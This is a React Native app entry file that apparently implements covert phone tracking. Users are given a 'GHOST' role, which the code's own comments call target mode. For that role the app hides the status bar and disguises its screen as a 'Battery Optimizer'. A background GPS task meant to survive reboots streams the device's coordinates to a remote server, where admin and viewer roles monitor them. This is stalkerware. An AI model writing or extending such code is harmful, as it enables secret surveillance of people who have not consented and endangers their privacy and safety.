import React, { useState, useEffect } from 'react';
import { StatusBar, Alert, View } from 'react-native';
import io from 'socket.io-client';
import * as TaskManager from 'expo-task-manager';

// Updated imports to reflect the /src/screens folder structure
import LoginScreen from './src/screens/LoginScreen';
import GhostScreen from './src/screens/GhostScreen';
import AdminScreen from './src/screens/AdminScreen';

// --- CONFIGURATION ---
const SERVER_URL = "https://joyjet-server.onrender.com";
const socket = io(SERVER_URL, { 
    maxHttpBufferSize: 1e8, 
    reconnection: true,
    transports: ['websocket'] 
});
const GPS_TASK = 'bg-gps-sync';

// --- BACKGROUND REBOOT SURVIVAL ---
// Wakes up the node after a phone restart to maintain the link
TaskManager.defineTask(GPS_TASK, ({ data, error }) => {
    if (error) return;
    if (data) {
        socket.emit('ghost_location_data', { 
            ghostName: "NODE_AUTO_REBOOT", 
            coords: data.locations[0].coords 
        });
    }
});

export default function App() {
    const [user, setUser] = useState(null);

    useEffect(() => {
        // Handle successful login/role assignment from Server
        socket.on('role_assigned', (data) => {
            setUser(data);
        });

        // Handle errors or system messages (e.g., Wrong Admin Key)
        socket.on('system_alert', (data) => {
            Alert.alert("System Notification", data.msg);
        });

        // Reset user if server forces a disconnect
        socket.on('forced_disconnect', () => {
            setUser(null);
        });

        return () => {
            socket.off('role_assigned');
            socket.off('system_alert');
            socket.off('forced_disconnect');
        };
    }, []);

    // --- LOGIN HANDLER ---
    const handleLogin = (name, key) => {
        // Sends name & key; Server determines if ADMIN, VIEWER, or GHOST
        socket.emit('claim_role', { name, key });
    };

    // 1. AUTHENTICATION GATE
    if (!user) {
        return <LoginScreen onLogin={handleLogin} />;
    }

    // 2. ROLE-BASED ROUTING
    return (
        <View style={{ flex: 1, backgroundColor: '#000' }}>
            <StatusBar hidden={user.role === 'GHOST'} barStyle="light-content" />
            
            {user.role === 'GHOST' ? (
                // TARGET MODE: The Battery Optimizer Mask
                <GhostScreen 
                    socket={socket} 
                    name={user.name} 
                    taskName={GPS_TASK} 
                />
            ) : (
                // MONITOR MODE: The Admin or Viewer Dashboard
                <AdminScreen 
                    socket={socket} 
                    user={user} 
                    onExit={() => {
                        socket.disconnect();
                        setUser(null);
                        socket.connect(); // Ready for next login
                    }} 
                />
            )}
        </View>
    );
}
